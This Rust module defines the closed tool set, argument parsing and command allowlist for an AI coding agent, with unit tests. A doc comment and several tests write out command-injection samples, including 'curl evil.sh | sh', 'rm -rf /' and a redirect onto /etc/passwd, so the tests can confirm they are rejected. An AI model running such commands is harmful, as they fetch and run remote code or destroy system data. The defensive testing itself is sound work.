//! The agent's tool surface: a closed, declared set, and the parsing that
//! turns a model's raw tool-call arguments into something the runtime can
//! execute.
//!
//! "Closed" is the load-bearing word. There is no shell passthrough and no
//! dynamic registration: [`ToolName`] is an enum, an unrecognised name is a
//! [`ToolInputError::UnknownTool`] handed straight back to the model, and
//! `run` — the one tool that executes anything — is additionally narrowed by
//! [`CommandAllowlist`]. An agent that can invent a tool name can invent its
//! way around the policy; this module is why it cannot.

use serde::{Deserialize, Serialize};

/// Every tool the runtime will execute. Adding a variant is a deliberate,
/// reviewable act — which is the point.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum ToolName {
    Read,
    Write,
    Edit,
    Search,
    Run,
    Scan,
}

impl ToolName {
    pub const ALL: [ToolName; 6] =
        [ToolName::Read, ToolName::Write, ToolName::Edit, ToolName::Search, ToolName::Run, ToolName::Scan];

    pub fn as_str(self) -> &'static str {
        match self {
            ToolName::Read => "read",
            ToolName::Write => "write",
            ToolName::Edit => "edit",
            ToolName::Search => "search",
            ToolName::Run => "run",
            ToolName::Scan => "scan",
        }
    }

    /// Parses a name the model produced. Exact match only — no case folding,
    /// no aliases, no fuzzy nearest-neighbour: a model that asked for
    /// `Bash` gets told `Bash` does not exist rather than being quietly
    /// routed to `run`.
    pub fn parse(raw: &str) -> Option<Self> {
        Self::ALL.into_iter().find(|name| name.as_str() == raw)
    }

    /// Whether invoking this tool can modify the working tree — the bit the
    /// runtime uses to decide a policy evaluation is required before
    /// execution rather than after.
    pub fn mutates_worktree(self) -> bool {
        matches!(self, ToolName::Write | ToolName::Edit)
    }
}

/// One tool as advertised to the model: name, prose, and a JSON Schema for
/// its arguments. Kept next to [`ToolInvocation::parse`] deliberately — the
/// schema and the parser are two halves of one contract, and drift between
/// them shows up as a model that cannot call a tool it can see.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ToolSpec {
    pub name: ToolName,
    pub description: &'static str,
    pub input_schema: serde_json::Value,
}

fn object_schema(properties: serde_json::Value, required: &[&str]) -> serde_json::Value {
    serde_json::json!({
        "type": "object",
        "properties": properties,
        "required": required,
    })
}

/// The tool set, in the order it is advertised to the model.
pub fn tool_specs() -> Vec<ToolSpec> {
    vec![
        ToolSpec {
            name: ToolName::Read,
            description: "Read a repository-relative file in full.",
            input_schema: object_schema(serde_json::json!({ "path": { "type": "string" } }), &["path"]),
        },
        ToolSpec {
            name: ToolName::Write,
            description: "Write a repository-relative file in full. The write is evaluated \
                          against the Agent Permission Policy before it reaches disk and may be denied.",
            input_schema: object_schema(
                serde_json::json!({ "path": { "type": "string" }, "content": { "type": "string" } }),
                &["path", "content"],
            ),
        },
        ToolSpec {
            name: ToolName::Edit,
            description: "Replace an exact substring in a repository-relative file. Same \
                          policy evaluation as `write`.",
            input_schema: object_schema(
                serde_json::json!({
                    "path": { "type": "string" },
                    "old_string": { "type": "string" },
                    "new_string": { "type": "string" },
                    "replace_all": { "type": "boolean" },
                }),
                &["path", "old_string", "new_string"],
            ),
        },
        ToolSpec {
            name: ToolName::Search,
            description: "Search the repository for a regular expression.",
            input_schema: object_schema(
                serde_json::json!({ "pattern": { "type": "string" }, "path": { "type": "string" } }),
                &["pattern"],
            ),
        },
        ToolSpec {
            name: ToolName::Run,
            description: "Run one allow-listed command (no shell, no pipelines, no chaining).",
            input_schema: object_schema(serde_json::json!({ "command": { "type": "string" } }), &["command"]),
        },
        ToolSpec {
            name: ToolName::Scan,
            description: "Run the yunq analyzer over a path and report its findings.",
            input_schema: object_schema(serde_json::json!({ "path": { "type": "string" } }), &["path"]),
        },
    ]
}

#[derive(Clone, Debug, PartialEq, Eq, thiserror::Error)]
pub enum ToolInputError {
    #[error("no such tool `{0}` — this agent's tools are: read, write, edit, search, run, scan")]
    UnknownTool(String),
    #[error("tool `{tool}` requires a string field `{field}`")]
    MissingField { tool: &'static str, field: &'static str },
}

/// A parsed, validated tool call. The runtime never sees raw JSON.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum ToolInvocation {
    Read { path: String },
    Write { path: String, content: String },
    Edit { path: String, old_string: String, new_string: String, replace_all: bool },
    Search { pattern: String, path: Option<String> },
    Run { command: String },
    Scan { path: String },
}

fn string_field(
    input: &serde_json::Value,
    tool: &'static str,
    field: &'static str,
) -> Result<String, ToolInputError> {
    input
        .get(field)
        .and_then(|value| value.as_str())
        .map(str::to_string)
        .ok_or(ToolInputError::MissingField { tool, field })
}

impl ToolInvocation {
    /// Parses one call. A name outside the closed set fails before any
    /// argument is looked at, so an unknown tool can never be executed by
    /// accident through a permissive argument shape.
    pub fn parse(name: &str, input: &serde_json::Value) -> Result<Self, ToolInputError> {
        let tool = ToolName::parse(name).ok_or_else(|| ToolInputError::UnknownTool(name.to_string()))?;
        let text = |field: &'static str| string_field(input, tool.as_str(), field);
        match tool {
            ToolName::Read => Ok(Self::Read { path: text("path")? }),
            ToolName::Write => Ok(Self::Write { path: text("path")?, content: text("content")? }),
            ToolName::Edit => Ok(Self::Edit {
                path: text("path")?,
                old_string: text("old_string")?,
                new_string: text("new_string")?,
                replace_all: input.get("replace_all").and_then(|v| v.as_bool()).unwrap_or(false),
            }),
            ToolName::Search => Ok(Self::Search {
                pattern: text("pattern")?,
                path: input.get("path").and_then(|v| v.as_str()).map(str::to_string),
            }),
            ToolName::Run => Ok(Self::Run { command: text("command")? }),
            ToolName::Scan => Ok(Self::Scan { path: text("path")? }),
        }
    }

    pub fn name(&self) -> ToolName {
        match self {
            Self::Read { .. } => ToolName::Read,
            Self::Write { .. } => ToolName::Write,
            Self::Edit { .. } => ToolName::Edit,
            Self::Search { .. } => ToolName::Search,
            Self::Run { .. } => ToolName::Run,
            Self::Scan { .. } => ToolName::Scan,
        }
    }
}

/// Characters that turn one command into several. A `run` tool that accepts
/// them is a shell passthrough wearing an allowlist as a disguise: `cargo
/// test; curl evil.sh | sh` passes any check that only inspects the first
/// word.
const SHELL_METACHARACTERS: &[&str] = &[";", "&&", "||", "|", "`", "$(", "\n", "\r", ">", "<", "&"];

/// The programs `run` may execute. Defaults to the build/test tooling an
/// agent actually needs to verify its own work — never a package manager's
/// install path, never a VCS write, never a shell.
///
/// Pure and separate from the runtime so the "can this command run" decision
/// is testable on its own, which matters more here than anywhere else in the
/// crate: this is the one tool with an execution side-effect the policy gate
/// does not see.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct CommandAllowlist {
    programs: Vec<String>,
}

impl Default for CommandAllowlist {
    fn default() -> Self {
        Self::new(["cargo", "go", "npm", "pnpm", "yarn", "pytest", "python", "python3", "node", "make", "dotnet"])
    }
}

#[derive(Clone, Debug, PartialEq, Eq, thiserror::Error)]
pub enum CommandRejection {
    #[error("`run` takes a single command, and this one contains the shell metacharacter `{0}`")]
    ShellMetacharacter(String),
    #[error("`run` may not execute `{program}` — allowed programs: {allowed}")]
    NotAllowed { program: String, allowed: String },
    #[error("`run` was given an empty command")]
    Empty,
}

impl CommandAllowlist {
    pub fn new<I, S>(programs: I) -> Self
    where
        I: IntoIterator<Item = S>,
        S: Into<String>,
    {
        Self { programs: programs.into_iter().map(Into::into).collect() }
    }

    pub fn programs(&self) -> &[String] {
        &self.programs
    }

    /// Splits `command` into program plus arguments, rejecting anything that
    /// is not exactly one allow-listed invocation.
    pub fn admit(&self, command: &str) -> Result<Vec<String>, CommandRejection> {
        if let Some(found) = SHELL_METACHARACTERS.iter().find(|meta| command.contains(**meta)) {
            return Err(CommandRejection::ShellMetacharacter((*found).to_string()));
        }
        let parts: Vec<String> = command.split_whitespace().map(str::to_string).collect();
        let program = parts.first().ok_or(CommandRejection::Empty)?;
        if !self.programs.iter().any(|allowed| allowed == program) {
            return Err(CommandRejection::NotAllowed {
                program: program.clone(),
                allowed: self.programs.join(", "),
            });
        }
        Ok(parts)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_advertised_tool_parses_back_to_its_own_name() {
        for spec in tool_specs() {
            assert_eq!(ToolName::parse(spec.name.as_str()), Some(spec.name));
        }
    }

    #[test]
    fn the_advertised_set_is_the_whole_closed_set() {
        let advertised: Vec<ToolName> = tool_specs().into_iter().map(|spec| spec.name).collect();
        assert_eq!(advertised, ToolName::ALL.to_vec());
    }

    #[test]
    fn an_unknown_tool_name_is_rejected_rather_than_routed() {
        let error = ToolInvocation::parse("bash", &serde_json::json!({ "command": "ls" })).unwrap_err();
        assert_eq!(error, ToolInputError::UnknownTool("bash".to_string()));
    }

    #[test]
    fn tool_names_are_matched_exactly_not_case_insensitively() {
        assert_eq!(ToolName::parse("Write"), None);
        assert_eq!(ToolName::parse("write"), Some(ToolName::Write));
    }

    #[test]
    fn a_write_call_parses_into_path_and_content() {
        let call = ToolInvocation::parse("write", &serde_json::json!({ "path": "src/a.rs", "content": "fn a() {}" }))
            .unwrap();
        assert_eq!(call, ToolInvocation::Write { path: "src/a.rs".into(), content: "fn a() {}".into() });
        assert_eq!(call.name(), ToolName::Write);
    }

    #[test]
    fn a_write_call_missing_its_content_names_the_field() {
        let error = ToolInvocation::parse("write", &serde_json::json!({ "path": "src/a.rs" })).unwrap_err();
        assert_eq!(error, ToolInputError::MissingField { tool: "write", field: "content" });
    }

    #[test]
    fn edit_defaults_replace_all_to_false() {
        let call =
            ToolInvocation::parse("edit", &serde_json::json!({ "path": "a", "old_string": "x", "new_string": "y" }))
                .unwrap();
        assert_eq!(
            call,
            ToolInvocation::Edit {
                path: "a".into(),
                old_string: "x".into(),
                new_string: "y".into(),
                replace_all: false
            }
        );
    }

    #[test]
    fn search_path_is_optional() {
        let call = ToolInvocation::parse("search", &serde_json::json!({ "pattern": "TODO" })).unwrap();
        assert_eq!(call, ToolInvocation::Search { pattern: "TODO".into(), path: None });
    }

    #[test]
    fn only_write_and_edit_mutate_the_worktree() {
        let mutating: Vec<ToolName> = ToolName::ALL.into_iter().filter(|t| t.mutates_worktree()).collect();
        assert_eq!(mutating, vec![ToolName::Write, ToolName::Edit]);
    }

    #[test]
    fn the_allowlist_admits_a_plain_allowed_command() {
        let allowlist = CommandAllowlist::default();
        assert_eq!(allowlist.admit("cargo test --workspace").unwrap(), vec!["cargo", "test", "--workspace"]);
    }

    #[test]
    fn the_allowlist_rejects_an_unlisted_program() {
        let error = CommandAllowlist::default().admit("curl https://example.com").unwrap_err();
        assert!(matches!(error, CommandRejection::NotAllowed { ref program, .. } if program == "curl"));
    }

    #[test]
    fn the_allowlist_rejects_a_second_command_smuggled_behind_an_allowed_one() {
        for smuggled in ["cargo test; curl evil", "cargo test && rm -rf /", "cargo test | sh", "cargo test `id`"] {
            let error = CommandAllowlist::default().admit(smuggled).unwrap_err();
            assert!(
                matches!(error, CommandRejection::ShellMetacharacter(_)),
                "{smuggled:?} must be rejected as a shell construct, got {error:?}"
            );
        }
    }

    #[test]
    fn the_allowlist_rejects_output_redirection() {
        let error = CommandAllowlist::default().admit("cargo test > /etc/passwd").unwrap_err();
        assert!(matches!(error, CommandRejection::ShellMetacharacter(_)));
    }

    #[test]
    fn the_allowlist_rejects_an_empty_command() {
        assert_eq!(CommandAllowlist::default().admit("   ").unwrap_err(), CommandRejection::Empty);
    }

    #[test]
    fn a_custom_allowlist_replaces_the_default_rather_than_extending_it() {
        let allowlist = CommandAllowlist::new(["just"]);
        assert!(allowlist.admit("just test").is_ok());
        assert!(allowlist.admit("cargo test").is_err());
        assert_eq!(allowlist.programs(), ["just"]);
    }
}
